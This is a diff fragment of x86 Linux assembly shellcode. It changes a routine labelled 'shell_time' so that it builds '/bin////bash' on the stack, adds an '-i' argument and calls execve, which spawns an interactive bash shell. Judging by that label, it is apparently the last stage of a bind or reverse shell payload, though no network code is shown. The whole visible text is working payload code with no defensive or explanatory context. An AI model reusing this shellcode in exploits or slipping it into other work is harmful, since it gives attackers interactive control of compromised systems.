@@ -199,12 +199,15 @@ shell_time:
 	push 0x68736162	; hsab
 	push 0x2f2f2f2f	; ////
 	push 0x6e69622f	; nib/ 
-	xor ebx, ebx	; clean out ebx, though may be unnecessary
 	mov ebx, esp	; save stack pointer in ebx
-	push eax	; push another null onto stack
-	mov edx, esp	; 0x00hsab////nib/0x00
+	push eax	; Null onto stack
+	push word 0x692d	; "i" parameter to /bin/bash
+	mov esi, esp	; save the argument pointer 
+	push eax	; null byte terminator
+	push esi	; pointer to "i" parameter to /bin/bash
 	push ebx	; points to 0x00hsab////nib/
 	mov ecx, esp	; store pointer to 0x00hsab////nib/ into ecx
+	xor edx, edx	; NULL as last parameter
 	mov al, 0xb	; execve
 	int 0x80	; call it
 	
